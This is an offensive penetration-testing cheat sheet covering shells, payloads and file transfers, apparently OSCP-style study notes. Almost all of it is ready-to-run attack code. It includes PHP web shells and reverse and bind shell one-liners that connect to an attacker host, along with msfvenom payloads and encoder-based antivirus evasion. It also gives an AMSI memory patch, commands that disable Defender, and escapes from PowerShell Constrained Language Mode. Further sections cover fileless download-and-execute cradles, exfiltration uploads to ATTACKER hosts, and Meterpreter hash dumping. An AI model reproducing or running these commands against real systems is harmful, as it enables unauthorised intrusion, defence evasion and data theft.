# PHASE 6: SHELLS & PAYLOADS

> Identify OS first, then select shell type. Web shells for initial access, reverse/bind for full control.

---

## 6.0 - OS Fingerprinting (before shell selection)
```bash
# TTL-based detection
# TTL 128 = Windows, TTL 64 = Linux

# Nmap OS detection
nmap -O <target>
nmap --script banner.nse -sV <target>

# Check target for available interpreters
which python3 python php perl ruby bash nc ncat powershell 2>/dev/null
```

## 6.0b - Web Shells (initial access via web app)
```bash
# Simple PHP web shells
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd=($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>

# Upload vectors:
# - Unrestricted file upload
# - WAR deployment (Tomcat/Axis2/WebLogic)
# - Misconfigured FTP to webroot
# - File inclusion (LFI + uploaded image with PHP code)

# Kali web shells location
/usr/share/webshells/
```

## 6.1 - Reverse Shell Selection
```
Decision: What's available on target?
├── bash → bash -i >& /dev/tcp/<attacker>/<port> 0>&1
├── python → python3 -c 'import socket,subprocess,os;...'
├── php → php -r '$sock=fsockopen(...);exec("/bin/bash -i ...");'
├── netcat → nc <attacker> <port> -e /bin/bash
├── powershell → PowerShell TCP client one-liner
├── none of above → MSFvenom binary upload
└── AV blocking? → Encoded payloads, living off the land
```

### Linux Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/<attacker>/<port> 0>&1

# Netcat with named pipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker> <port> > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

# PHP
php -r '$sock=fsockopen("<attacker>",<port>);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Windows Reverse Shells
```powershell
# PowerShell one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-PowerShellTcp.ps1')
```

## 6.1b - Shell Stabilization (Full TTY)
```bash
# Step 1: Spawn PTY (pick one that works)
python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'

# Step 2: Background and configure terminal
# Ctrl+Z to background the shell
stty raw -echo
fg
# Hit Enter twice

# Step 3: Set terminal type and size
export TERM=xterm-256color
stty rows 67 columns 318

# Now tab completion, Ctrl+C, arrow keys, and interactive programs work
```

## 6.1c - Bind Shell (when target can't connect out)
```bash
# Linux
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 > /tmp/f

# Windows PowerShell
powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]1234;$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close();$listener.Stop()"

# Connect to bind shell
nc -nv TARGET 1234
```

## 6.2 - MSFvenom Payloads
```
Decision: Staged vs Stageless?
├── Staged (small, needs handler): linux/x86/shell/reverse_tcp
├── Stageless (large, self-contained): linux/x86/shell_reverse_tcp
└── Naming: /shell/ = staged, _reverse_tcp = stageless
```

**Windows Prominent Exploits:**
```
MS08-067       → RCE (SMB, Windows 2000-2003)
EternalBlue    → MS17-010 (SMB, Windows 7/2008)
BlueKeep       → CVE-2019-0708 (RDP, Windows 2000-2003)
PrintNightmare → CVE-2021-34527 (Print Spooler)
Sigred         → CVE-2020-1350 (DNS, Windows 2003-2019)
SeriousSam     → CVE-2021-36934 (SAM/SYSTEM read)
Zerologon      → CVE-2020-1472 (Netlogon, DC compromise)
```

**Payload Transfer Methods:**
```bash
# Impacket SMB (psexec, wmiexec, smbclient)
smbclient //<target>/C$ -U <user> -p '<pass>' -c "put shell.exe"

# SMB share (attacker)
sudo smbserver.py -smb2support share /path/to/dir
copy \\<attacker>\share\shell.exe C:\Windows\Temp\

# FTP
python3 -m pyftpdlib -p 21 -u user -P pass
ftp <target> → get shell.exe

# HTTP (most reliable)
python3 -m http.server 8080
certutil -urlcache -f http://<attacker>:8080/shell.exe shell.exe
```

```bash
# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f elf -o shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=<attacker> LPORT=<port> -f raw -o shell.php

# JSP (Tomcat WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f aspx -o shell.aspx

# With encoding (AV evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# DLL payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f dll -o shell.dll

# MSI payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f msi -o shell.msi
# Execute: msiexec /q /i shell.msi

# BAT payload (manual)
echo powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')" > shell.bat

# VBS payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f vbs -o shell.vbs

# DLL injection (rundll32)
rundll32.exe shell.dll,EntryPoint
```

## 6.2b - AV Evasion Techniques
```
├── Encoding: msfvenom -e x86/shikata_ga_nai -i 5
├── Multiple encoders: -i 5 -e x86/shikata_ga_nai -f raw | msfvenom -e x86/alpha_mixed -i 3
├── Living off the land (LOLBAS):
│   ├── certutil -urlcache -f http://ATTACKER/shell.exe shell.exe
│   ├── mshta http://ATTACKER/shell.hta
│   ├── regsvr32 /s /n /u /i:http://ATTACKER/shell.sct scrobj.dll
│   ├── rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=new%20ActiveXObject("WScript.Shell");o.Run("cmd /c powershell ...");
│   └── Reference: https://lolbas-project.github.io/
├── PowerShell download cradle + IEX (fileless):
│   IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
├── Darkarmour: obfuscated Linux ELF binaries
└── Custom payloads: avoid known signatures
```

### 6.2c - AMSI Bypass (PowerShell)

> AMSI scans content passed to PowerShell/scripting engines. Patch in-memory before running malicious code.

**Classic one-liner (works on un-patched AMSI):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**String-split obfuscation (evades signature on the above):**
```powershell
$a='System.Management.Automation.A';$b='msiUtils'
$c=[Ref].Assembly.GetType("$a$b")
$d=$c.GetField('amsiInitFailed','NonPublic,Static')
$d.SetValue($null,$true)
```

**Memory-patching AMSI.dll (modern):**
```powershell
# Patches AmsiScanBuffer to always return CLEAN
$Win32 = @"
using System;using System.Runtime.InteropServices;
public class Win32 {
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "ScanBuffer")
$p = 0; [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

**Defender disable (requires admin / SYSTEM):**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -ExclusionPath C:\Windows\Temp
```

**Constrained Language Mode (CLM) escape:**
```powershell
# Check mode
$ExecutionContext.SessionState.LanguageMode

# Bypass 1: Downgrade to PowerShell v2 (no CLM)
powershell.exe -version 2
$ExecutionContext.SessionState.LanguageMode   # FullLanguage

# Bypass 2: Runspace from new AppDomain
[System.Management.Automation.Runspaces.Runspace]::DefaultRunspace.SessionStateProxy.LanguageMode = "FullLanguage"

# Bypass 3: Use .NET reflection directly (CLM doesn't block C# / Add-Type via certain paths)
# Or: PowerShdll.dll — execute PowerShell outside powershell.exe (bypasses session policies)
rundll32.exe PowerShdll.dll,main . { iex (iwr -useb http://ATTACKER/shell.ps1) }
```

## 6.3 - Metasploit Workflow
```bash
msfconsole

# Module info before using
info <module>              # Full module description, options, targets
check <module>             # Test if target is vulnerable (safe)

search <service/vulnerability>
use <number>
show options
set RHOSTS <target>
set LHOST <attacker>
exploit

# Persistent options (survive module switches)
setg RHOSTS <target>
setg LHOST <attacker>

# Background session
background
sessions -l
sessions -i <id>

# Filter payloads within msfconsole
grep meterpreter show payloads

# Meterpreter post-exploitation
getuid                     # Current user
sysinfo                    # System info
migrate <PID>              # Move to another process
hashdump                   # Dump SAM hashes
screenshot                 # Capture screen
upload/download            # File transfer
portfwd add -L <lp> -p <rp> -r <target>  # Port forwarding
shell                      # Drop to system shell
load kiwi                  # Load Mimikatz

# Key modules
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/psexec
use exploit/multi/http/tomcat_mgr_upload
use exploit/unix/webapp/wp_admin_shell_upload
use auxiliary/scanner/smb/smb_login

# Database (track hosts/services/creds across session)
msfdb init                 # Initialize PostgreSQL
workspace -a <name>        # Create workspace
db_nmap -sC -sV <target>   # Import scan results
hosts                      # List discovered hosts
services                   # List discovered services
creds                      # List cracked credentials
loot                       # List extracted loot
```

## 6.4 - Listener Setup
```bash
# Netcat
nc -lvnp <port>

# Metasploit handler
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <attacker>
set LPORT <port>
exploit
```

---

# PHASE 10B: FILE TRANSFERS

## Transfer Methods Decision Tree
```
Can you write to disk on target?
├─ YES → Use wget/curl/certutil/bitsadmin
└─ NO → Fileless: curl URL | bash / IEX DownloadString / php -r pipe

What ports are outbound-open?
├─ 80/443 → HTTP(S): python http.server, nginx PUT, uploadserver
├─ 445 → SMB: impacket-smbserver (authenticated if guest blocked)
├─ 445 blocked but 80 open → WebDAV (wsgidav)
├─ 21 → FTP: pyftpdlib (--write for uploads)
├─ 22 → SCP
├─ 5985/5986 → WinRM Copy-Item session
├─ 3389 → RDP drive mount (xfreerdp /drive:)
└─ None of the above → Base64 clipboard, /dev/tcp, RDP mount

Is PowerShell blocked?
├─ YES → certutil, bitsadmin CLI, LOLBAS, cscript/vbscript, code-based
└─ NO → Invoke-WebRequest (-UseBasicParsing, -UserAgent spoof, SSL bypass)

Need to exfiltrate sensitive loot (NTDS.dit, SAM)?
└─ Encrypt first: openssl enc -aes256 -pbkdf2 -in FILE -out FILE.enc
```

**Code-based transfers (when wget/curl unavailable):**
```bash
# PHP download
php -r 'file_put_contents("/tmp/file",file_get_contents("http://ATTACKER/file"));'

# PHP upload
php -r 'file_put_contents("http://ATTACKER/upload",file_get_contents("/tmp/file"));'

# Python download
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATTACKER/file","/tmp/file")'

# Python upload
python3 -c 'import requests;requests.post("http://ATTACKER/upload",files={"f":open("/tmp/file","rb")})'

# Bash /dev/tcp (no wget/curl/nc)
exec 3<>/dev/tcp/ATTACKER/80; echo -e "GET /file HTTP/1.0\n\n">&3; cat <&3 > /tmp/file

# Fileless execution (Linux)
curl -s http://ATTACKER/shell.sh | bash
wget -qO- http://ATTACKER/shell.sh | bash

# Fileless execution (Windows)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
```

**WebDAV (SMB 445 blocked, HTTP 80 open):**
```bash
# Attacker
pip3 install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Target (Windows)
dir \\ATTACKER\DavWWWRoot
copy file.exe \\ATTACKER\DavWWWRoot\
```

**WinRM session file transfer:**
```powershell
# Between Windows hosts (no external server needed)
$Session = New-PSSession -ComputerName TARGET -Credential $Cred
Copy-Item -Path C:\file.exe -ToSession $Session -Destination C:\Windows\Temp\
Copy-Item -FromSession $Session -Path C:\remote\file -Destination C:\local\
```

**RDP drive mount:**
```bash
# Mount local drive to remote RDP session
xfreerdp /v:TARGET /u:user /p:pass /drive:share,/tmp
# Access on target: \\tsclient\share\file
```

**User agent evasion:**
```powershell
# Spoof browser UA to avoid detection
$UA = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://ATTACKER/file -OutFile file -UserAgent $UA
```

**certutil UA fingerprint:** Microsoft-CryptoAPI/10.0
**BITS UA fingerprint:** Microsoft BITS/7.8
**PowerShell UA fingerprint:** WindowsPowerShell/5.x

## Transferring TO Windows
```bash
# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/file.exe','C:\Windows\Temp\file.exe')"

# Invoke-WebRequest (-UseBasicParsing if IE first-launch not completed)
powershell -c "Invoke-WebRequest -Uri http://ATTACKER:8080/file.exe -OutFile C:\Windows\Temp\file.exe -UseBasicParsing"

# Download + execute (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')

# SSL/TLS bypass for HTTPS
powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object Net.WebClient).DownloadFile('https://ATTACKER/file.exe','C:\file.exe')"

# certutil (always present)
certutil -urlcache -f http://ATTACKER:8080/file.exe C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER:8080/file.exe C:\Windows\Temp\file.exe

# SMB (unauthenticated)
copy \\ATTACKER\share\file.exe C:\Windows\Temp\file.exe

# SMB with authentication (newer Windows blocks guest)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
net use n: \\ATTACKER\share /user:test test
copy n:\file.exe C:\Windows\Temp\file.exe

# FTP command file (non-interactive shells)
echo open ATTACKER > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.exe >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

# WebDAV (SMB over HTTP - when SMB blocked but HTTP allowed)
# Attacker: sudo pip3 install wsgidav cheroot && sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
dir \\ATTACKER\DavWWWRoot
copy file.exe \\ATTACKER\DavWWWRoot\

# MSI execution
msiexec /q /i shell.msi

# DLL execution
rundll32.exe shell.dll,EntryPoint
```

## Upload FROM Target
```bash
# PowerShell upload (attacker runs uploadserver)
pip3 install uploadserver && python3 -m uploadserver
# On target:
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://ATTACKER:8000/upload -File C:\path\to\file

# Base64 POST upload
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\file' -Encoding Byte))
Invoke-WebRequest -Uri http://ATTACKER:8000/ -Method POST -Body $b64
```

## Transferring TO Linux
```bash
# wget/curl
wget http://ATTACKER:8080/file -O /tmp/file
curl http://ATTACKER:8080/file -o /tmp/file

# scp
scp file user@TARGET:/tmp/

# netcat
nc -lvnp 4444 > file  # on receiver
nc ATTACKER 4444 < file  # on sender

# Base64 (small files, no network tools)
cat file | base64 -w 0; echo    # Encode (no line wraps)
echo 'BASE64...' | base64 -d > file  # Decode
```

## File Validation
```bash
file shell            # Verify file type
md5sum shell          # Verify integrity
# Windows:
Get-FileHash file -Algorithm md5
```

---